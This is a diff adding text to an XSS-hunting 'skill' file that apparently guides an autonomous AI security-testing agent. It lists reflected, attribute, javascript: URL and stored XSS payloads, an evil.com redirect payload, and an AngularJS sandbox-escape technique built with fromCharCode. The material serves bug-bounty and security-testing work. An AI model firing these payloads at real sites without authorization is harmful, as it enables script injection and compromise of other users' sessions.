@@ -1,8 +1,45 @@
 ---
 name: hunt-xss
-description: Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target.
+description: Hunting skill for xss vulnerabilities. Built from 174 public bug bounty reports. Use when hunting xss on any target. For markup injection that reflects raw HTML but does NOT execute JavaScript (no `<script>`/event-handler execution), see hunt-html-injection — escalate here once script execution is possible.
 sources: github, hackerone_public
 report_count: 174
+---
+
+## Autonomous Testing Priority
+
+**Verify reflection before claiming XSS — encoding is everything.**
+
+Your payload must appear in the response body with angle brackets UNESCAPED. `<script>` is XSS. `&lt;script&gt;` is safe encoding — not vulnerable.
+
+**Use a UNIQUE NUMERIC CANARY in your proof payload** — e.g. `<script>alert(91234)</script>` or `"><img src=x onerror=alert(91234)>`. Pick a distinctive 4+ digit number, not `alert(1)`. Practice pages are full of *example* payloads like `alert(1)`/`alert('XSS')` in their hint text; a unique number is how you tell YOUR reflected payload apart from the page's decoy examples. Proof = your `alert(<canary>)` shows up in the response with raw, unescaped angle brackets.
+
+**Try these contexts in order:**
+
+1. **Inline script injection** (works when HTML context allows new tags):
+   ```
+   <script>alert(CANARY)</script>
+   ```
+   Use whatever canary string your proof contract specifies. Confirmed when `<script>alert(CANARY)` appears literally (not HTML-encoded) in the response.
+
+2. **Attribute event injection** (when `<` is filtered but attributes are injectable):
+   ```
+   " onmouseover="alert(CANARY)
+   " onerror="alert(CANARY)
+   " onload="alert(CANARY)
+   ```
+
+3. **URL/href context:**
+   ```
+   javascript:alert(CANARY)
+   ```
+
+**Distinguishing success from failure:**
+- **Vulnerable:** response contains `<script>alert(` unescaped — browser would execute it
+- **Filtered/safe:** response contains `&lt;script&gt;` or `&#x3C;script&#x3E;` — properly encoded
+- **Blocked:** response is an error, or the reflected value is absent entirely
+
+**For stored XSS:** inject into a field that other pages display (comments, usernames, ticket titles). Then fetch the rendering page and check for unescaped payload. The payload executes when any user views that page — higher severity than reflected.
+
 ---
 
 ## Crown Jewel Targets
@@ -296,6 +333,18 @@ curl -sk "https://target.com/page" | grep -i "evil.com"
 ?next=javascript&colon;alert(1)
 ?redirect=//evil.com/%0d%0a%0d%0a<script>alert(1)</script>
 ```
+
+**AngularJS client-side template injection (CSTI) & sandbox escapes:**
+- *Detect:* the page uses AngularJS (look for `ng-app`/`ng-controller` attributes, `angular.js`/`angular.min.js`, or `{{ }}` interpolation). Probe a reflected param with `{{7*7}}` — if it renders `49` (not the literal text), the value is evaluated as an Angular expression. Always drive the `browser` tool so the expression actually evaluates.
+- *Execute JS by escaping the sandbox* (technique depends on the AngularJS version):
+  - Common: `{{constructor.constructor('alert(1)')()}}` or `{{$eval.constructor('alert(1)')()}}`.
+  - **Hard variant — `$eval` unavailable AND string literals disallowed:** overwrite `String.prototype.charAt` (this disables the sandbox's per-character string checks), then use the `orderBy` filter with `String.fromCharCode` to build your JS with no quotes at all. Payload structure (fill in the placeholders yourself):
+    ```
+    ?PARAM=1&toString().constructor.prototype.charAt=[].join;[1]|orderBy:toString().constructor.fromCharCode(CODES)=1
+    ```
+    - `PARAM` = the reflected parameter you found.
+    - `CODES` = the comma-separated character codes of the JavaScript you want to run — **compute these yourself** (e.g. encode `x=alert(1)` by converting each character to its char code). `toString()` produces a string without quotes; `[].join` replaces `charAt`; `orderBy` invokes the filter; `fromCharCode(CODES)` rebuilds your payload from the codes.
+- Applies to **legacy AngularJS (<1.6)** only; modern frameworks (Angular 2+, React, Vue) are not affected.
 
 ---
 
